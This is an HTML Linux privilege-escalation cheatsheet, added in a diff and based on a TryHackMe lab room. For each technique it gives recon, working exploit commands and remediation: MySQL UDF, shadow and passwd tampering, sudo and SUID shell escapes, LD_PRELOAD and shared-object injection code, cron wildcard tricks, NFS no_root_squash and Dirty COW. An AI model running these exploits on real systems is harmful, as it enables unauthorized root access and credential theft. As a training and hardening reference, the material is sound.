@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Linux PrivEsc Cheatsheet</title>
+<style>
+:root{
+  --bg:#f6f7f9; --surface:#ffffff; --text:#1a1d23; --muted:#5a6271;
+  --border:#e1e4e9; --accent:#b4231f; --code-bg:#1e2128; --code-text:#e8e9ec;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#15171c; --surface:#1c1f26; --text:#e8e9ec; --muted:#9aa2b1;
+    --border:#2c303a; --accent:#ff6b63; --code-bg:#0e1015; --code-text:#d7dae0;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#15171c; --surface:#1c1f26; --text:#e8e9ec; --muted:#9aa2b1;
+  --border:#2c303a; --accent:#ff6b63; --code-bg:#0e1015; --code-text:#d7dae0;
+  color-scheme: dark;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{
+  margin:0; background:var(--bg); color:var(--text);
+  font:15px/1.5 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+header{
+  padding:28px 16px 16px; max-width:900px; margin:0 auto;
+}
+h1{margin:0 0 4px; font-size:1.5rem}
+.sub{color:var(--muted); font-size:.9rem; margin:0}
+main{max-width:900px; margin:0 auto; padding:0 16px 48px}
+.task{
+  background:var(--surface); border:1px solid var(--border); border-radius:10px;
+  margin:14px 0; overflow:hidden;
+}
+.task summary{
+  cursor:pointer; padding:12px 16px; font-weight:600; list-style:none;
+  display:flex; gap:8px; align-items:baseline;
+}
+.task summary::-webkit-details-marker{display:none}
+.task summary .num{color:var(--accent); min-width:26px}
+.task .body{padding:0 16px 16px}
+.lbl{font-size:.72rem; font-weight:700; letter-spacing:.04em; text-transform:uppercase; color:var(--muted); margin:12px 0 4px}
+pre{
+  background:var(--code-bg); color:var(--code-text); padding:10px 12px; border-radius:8px;
+  overflow-x:auto; font-size:.82rem; margin:4px 0;
+}
+code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+p.note{margin:4px 0; color:var(--text)}
+.remediation{color:var(--muted)}
+footer{max-width:900px; margin:0 auto; padding:8px 16px 40px; color:var(--muted); font-size:.8rem}
+</style>
+</head>
+<body>
+<header>
+<h1>🐧 Linux PrivEsc Cheatsheet</h1>
+<p class="sub">Recon → Exploitation → Remediation, per technique. (TryHackMe "Linux PrivEsc" room)</p>
+</header>
+<main>
+
+<details class="task" open><summary><span class="num">02</span>MySQL UDF (running as root, no password)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">mysqld process itself runs as the root OS user, and root's MySQL account has no password. MySQL lets you register a User Defined Function backed by a compiled .so — once loaded, that function runs arbitrary shell commands with mysqld's privileges, i.e. root.</p>
+<p class="lbl">Recon</p>
+<pre><code>ps aux | grep mysql
+mysql -u root        # try blank password</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>cd /home/user/tools/mysql-udf
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root
+  use mysql;
+  create table foo(line blob);
+  insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+  select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+  create function do_system returns integer soname 'raptor_udf2.so';
+  select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+exit
+/tmp/rootbash -p</code></pre>
+<p class="remediation">🛡 Set a MySQL root password, run the service as a dedicated non-root user, disable UDF creation (<code>secure_file_priv</code>), restrict plugin dir write access.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">03</span>Readable /etc/shadow</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">/etc/shadow should only be readable by root (via the shadow group). If permissions are loose, any local user can copy out the password hashes and crack them offline at leisure.</p>
+<p class="lbl">Recon</p>
+<pre><code>ls -la /etc/shadow
+cat /etc/shadow</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>unshadow /etc/passwd /etc/shadow > combined.txt
+john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john combined.txt --show</code></pre>
+<p class="remediation">🛡 <code>chmod 640 /etc/shadow</code>, owner root:shadow, never world-readable.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">04</span>Writable /etc/shadow</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">The OS trusts whatever hash sits next to a username in /etc/shadow. If the file is writable, you don't need to crack anything — just overwrite root's hash with one you generated yourself, whose plaintext you know.</p>
+<p class="lbl">Recon</p>
+<pre><code>ls -la /etc/shadow</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>mkpasswd -m sha-512 newpassword     # generate hash
+# or: openssl passwd -1 newpassword
+nano /etc/shadow      # replace root's hash with the generated one
+su root</code></pre>
+<p class="remediation">🛡 Remove world/group write on /etc/shadow (<code>640 root:shadow</code>); audit for stray setuid helper scripts that write to it.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">05</span>Writable /etc/passwd</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">/etc/passwd's password field can hold a crypt hash directly, bypassing /etc/shadow entirely (legacy behavior). If the file is writable, appending a line with UID 0 creates a second root account whose password you control.</p>
+<p class="lbl">Recon</p>
+<pre><code>ls -la /etc/passwd</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>openssl passwd newpassword          # legacy crypt hash
+echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+su newroot</code></pre>
+<p class="remediation">🛡 <code>chmod 644 /etc/passwd</code>, owner root:root, never group/world-writable.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">06</span>Sudo — Shell Escape Sequences (GTFOBins)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">sudo grants the full privileges of the target binary, not just its intended function. Many interactive tools (pagers, editors, find) have a built-in "run a command" or "!shell" feature — invoking it from inside spawns a shell that inherits sudo's root context.</p>
+<p class="lbl">Recon</p>
+<pre><code>sudo -l</code></pre>
+<p class="lbl">Exploit (examples)</p>
+<pre><code>sudo less /etc/hosts     # then inside less: !/bin/sh
+sudo vi -c ':!/bin/sh'
+sudo find . -exec /bin/sh \; -quit
+sudo awk 'BEGIN {system("/bin/sh")}'</code></pre>
+<p class="remediation">🛡 Avoid granting sudo on interactive/text-editor/file-manager binaries; use <code>--restrict</code>/wrapper scripts; check GTFOBins before allow-listing a binary.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">07</span>Sudo — Environment Variables (LD_PRELOAD / env_keep)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">sudo normally resets the environment, but sudoers can whitelist variables via env_keep. If LD_PRELOAD survives, the dynamic linker loads your shared object before the real program runs — your constructor code executes first, already running as root.</p>
+<p class="lbl">Recon</p>
+<pre><code>sudo -l     # look for env_keep+=LD_PRELOAD or NOPASSWD entries</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>cat << EOF > /tmp/preload.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
+EOF
+gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
+sudo LD_PRELOAD=/tmp/preload.so &lt;allowed-binary&gt;</code></pre>
+<p class="remediation">🛡 Don't keep <code>LD_PRELOAD</code>/<code>LD_LIBRARY_PATH</code> in <code>env_keep</code>; use <code>Defaults env_reset</code> and <code>secure_path</code> in sudoers.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">08</span>Cron Jobs — File Permissions</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">A script scheduled by root's crontab runs with root's privileges every time it fires — regardless of who last edited it. If a low-privileged user can write to that script, their added commands run as root on the next trigger.</p>
+<p class="lbl">Recon</p>
+<pre><code>cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.*/
+pspy64     # watch processes live if available</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code># if a root-run script is world/group writable:
+echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /path/to/script.sh
+# wait for cron to fire, then:
+/tmp/rootbash -p</code></pre>
+<p class="remediation">🛡 <code>chmod 700</code> + root-owned for scripts triggered by root's cron; never let non-root users write to them.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">09</span>Cron Jobs — PATH Environment Variable</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">If a cron job calls a command by relative/bare name instead of a full path, the shell searches cron's PATH in order. A writable directory listed before the real binary's location lets you drop a same-named file that gets executed instead — as root.</p>
+<p class="lbl">Recon</p>
+<pre><code>cat /etc/crontab      # look for a relative-path command + PATH line
+ls -la /home/user</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code># if cron's PATH includes a writable dir (e.g. /home/user) before system dirs
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash' > /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+# wait, then:
+/tmp/rootbash -p</code></pre>
+<p class="remediation">🛡 Always use absolute paths inside cron scripts and set an explicit, safe <code>PATH</code> in crontab.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">10</span>Cron Jobs — Wildcards (wildcard injection / "tar checkpoint")</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">When a root cron job runs "tar * " or similar, the shell expands * to every filename in the directory before tar sees it. Filenames crafted to look like command-line flags (e.g. --checkpoint-action=exec=...) get parsed as real options, letting you smuggle a command into a root-run tool.</p>
+<p class="lbl">Recon</p>
+<pre><code>cat /etc/crontab      # look for tar/chown/rsync with a wildcard (*) argument</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>cd /target/dir
+echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+# wait for cron's tar * to run, then:
+/tmp/rootbash -p</code></pre>
+<p class="remediation">🛡 Avoid wildcards in privileged scripts; use <code>--</code> to stop option parsing, or reference files explicitly.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">11</span>SUID/SGID — Known Exploits (GTFOBins binaries)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">The SUID bit makes a binary always run as its owner (root), no matter who launches it. If that binary is on GTFOBins with a documented shell-escape or file-read/write feature, you get root-level behavior just by running it normally.</p>
+<p class="lbl">Recon</p>
+<pre><code>find / -perm -4000 -type f 2>/dev/null     # SUID
+find / -perm -2000 -type f 2>/dev/null     # SGID
+# cross-check each binary name on gtfobins.github.io</code></pre>
+<p class="lbl">Exploit (example: nmap old interactive mode)</p>
+<pre><code>nmap --interactive
+nmap&gt; !sh</code></pre>
+<p class="remediation">🛡 Remove unnecessary SUID bits (<code>chmod u-s</code>); patch/upgrade binaries with known GTFOBins SUID abuse paths.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">12</span>SUID/SGID — Shared Object Injection</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">The binary dynamically loads a library without pinning its exact path, so the linker searches a list of directories. If one of those is writable, you plant a fake .so with the same name — its constructor runs automatically, already inheriting the SUID binary's root privileges.</p>
+<p class="lbl">Recon</p>
+<pre><code>strace ./suid_binary 2>&amp;1 | grep -iE 'open|stat' | grep -i "no such file"</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>cat << EOF > /path/missing_lib.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+static void inject() __attribute__((constructor));
+void inject() { setuid(0); setgid(0); system("/bin/bash -p"); }
+EOF
+gcc -shared -fPIC -o /path/missing_lib.so.6 /path/missing_lib.c
+./suid_binary</code></pre>
+<p class="remediation">🛡 Set absolute <code>RPATH</code>, avoid loading libraries from writable/relative directories, keep <code>LD_LIBRARY_PATH</code> out of trusted execution.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">13</span>SUID/SGID — Environment Variables</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Instead of using a hardcoded full path, the SUID program calls an external command by bare name (e.g. "service") and relies on the inherited PATH to find it. Prepending a writable directory to PATH with your own fake "service" script makes the root process run your code.</p>
+<p class="lbl">Recon</p>
+<pre><code>strings suid_binary | grep -iE '^[a-z_]+$'   # look for commands called without full path, e.g. "service"</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>cd /tmp
+echo '/bin/bash -p' > service
+chmod +x service
+export PATH=/tmp:$PATH
+./suid_binary</code></pre>
+<p class="remediation">🛡 Call system binaries with full absolute paths inside SUID programs; drop inherited/untrusted <code>PATH</code> and env vars before <code>system()</code>/<code>exec()</code> calls.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">14</span>SUID/SGID — Abusing Shell Features #1 (bash &lt;4.2-048 function export)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Older bash versions let you export a shell function into the environment under a command's own name. When the SUID binary internally invokes that command name via a shell, your exported function definition runs instead of the real binary — as root.</p>
+<p class="lbl">Recon</p>
+<pre><code>bash --version
+ls -la suid_binary      # calls a command like "service apache2 start"</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+./suid_binary</code></pre>
+<p class="remediation">🛡 Upgrade bash past 4.4+ (CVE-2014-6271/Shellshock-era fix); don't call shell built-ins/externals by bare name from SUID C wrappers.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">15</span>SUID/SGID — Abusing Shell Features #2 (-p flag / setuid bash)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Modern bash drops its elevated effective UID back to the real UID as a safety measure — unless started with -p, which tells it "keep the privileges you were given." If a SUID binary (or you, on an SUID-bash target) launches bash with -p, that safety net never kicks in.</p>
+<p class="lbl">Recon</p>
+<pre><code>find / -perm -4000 -type f 2>/dev/null | grep bash</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code># if the SUID binary itself drops into a root-owned bash
+./suid_binary -p
+# or directly, if bash has SUID bit:
+bash -p</code></pre>
+<p class="remediation">🛡 Never set SUID on <code>bash</code>/other full shells; modern bash drops privileges unless invoked with <code>-p</code> — don't rely on that as a safety net either.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">16</span>Passwords & Keys — History Files</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Shells and CLI tools log every command you type to a history file in plaintext. If someone ever typed a password as a command-line argument (mysql -ppassword, su root &lt; password, etc.), it sits readable in that history file forever.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>cat ~/.bash_history
+cat ~/.mysql_history
+cat ~/.nano_history ~/.vim_history
+grep -iE 'pass|pwd|secret' ~/.*history 2>/dev/null</code></pre>
+<p class="remediation">🛡 Never pass secrets as CLI args/inline commands; <code>export HISTFILE=/dev/null</code> or clear history for privileged sessions; rotate any leaked creds.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">17</span>Passwords & Keys — Config Files</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Applications often store database or service credentials as plaintext in config files for simplicity. Those credentials frequently get reused for the root/admin account too, or directly unlock a service running with elevated privileges.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>find / -iname "*.conf" -o -iname "*config*" 2>/dev/null | grep -v proc
+grep -riE "password|passwd|pwd|secret" /var/www /etc 2>/dev/null
+cat /var/www/html/*/wp-config.php</code></pre>
+<p class="remediation">🛡 Restrict config file perms to the owning service account only; store secrets in a vault/env-injected at runtime, not plaintext config.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">18</span>Passwords & Keys — SSH Keys</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">SSH key-based auth trusts whoever holds the private key — no password needed. An unencrypted private key left readable by other users (or exposed in a backup/web root) lets anyone impersonate its owner on any server that trusts the matching public key.</p>
+<p class="lbl">Recon</p>
+<pre><code>find / -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null
+ls -la ~/.ssh /root/.ssh 2>/dev/null</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>chmod 600 id_rsa
+ssh -i id_rsa root@target</code></pre>
+<p class="remediation">🛡 Keep private keys <code>600</code>, readable only by the owner; never store unencrypted keys in web roots or world-readable dirs; use passphrase-protected keys.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">19</span>NFS — no_root_squash</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">By default NFS maps a remote client's root user down to "nobody" on the server (root_squash), to stop exactly this attack. If an export disables that (no_root_squash), a file you create as root on your own machine keeps its root ownership and SUID bit once it lands on the shared mount.</p>
+<p class="lbl">Recon</p>
+<pre><code># on target
+cat /etc/exports
+# on attacker
+showmount -e &lt;target-ip&gt;</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>mkdir /tmp/nfs
+mount -o rw,vers=2 &lt;target-ip&gt;:/share /tmp/nfs
+cp /bin/bash /tmp/nfs/rootbash
+chmod +xs /tmp/nfs/rootbash
+# on target, via the mounted share:
+/share/rootbash -p</code></pre>
+<p class="remediation">🛡 Use <code>root_squash</code> (default) in <code>/etc/exports</code>; restrict exports to specific hosts and set <code>no_suid</code>.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">20</span>Kernel Exploits</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">The kernel enforces every permission check in the system — a bug inside it bypasses those checks directly rather than tricking a program into misusing its own privileges. Dirty COW, for example, exploited a race condition in the copy-on-write memory handling to let any local user write to files they should only be able to read.</p>
+<p class="lbl">Recon</p>
+<pre><code>uname -a
+cat /etc/os-release
+searchsploit "Linux Kernel $(uname -r)"</code></pre>
+<p class="lbl">Exploit (example: Dirty COW CVE-2016-5195)</p>
+<pre><code>gcc -pthread dirty.c -o dirty -lcrypt
+./dirty newpassword
+su firefart</code></pre>
+<p class="remediation">🛡 Keep the kernel patched/updated; use live-patching (kpatch/kgraft) where reboot isn't feasible; test kernel exploits only in the lab, not blindly in prod.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">21</span>Automated PrivEsc Enumeration Scripts</summary><div class="body">
+<p class="lbl">Recon tools</p>
+<pre><code>./linpeas.sh | tee linpeas-out.txt
+python3 linenum.sh
+./linuxprivchecker.py</code></pre>
+<p class="remediation">🛡 Run these yourself periodically as a blue-team check — same scripts flag the misconfigs above before an attacker finds them.</p>
+</div></details>
+
+</main>
+<footer>Reference only — use in authorized labs/CTFs. Based on the TryHackMe "Linux PrivEsc" room.</footer>
+</body>
+</html>
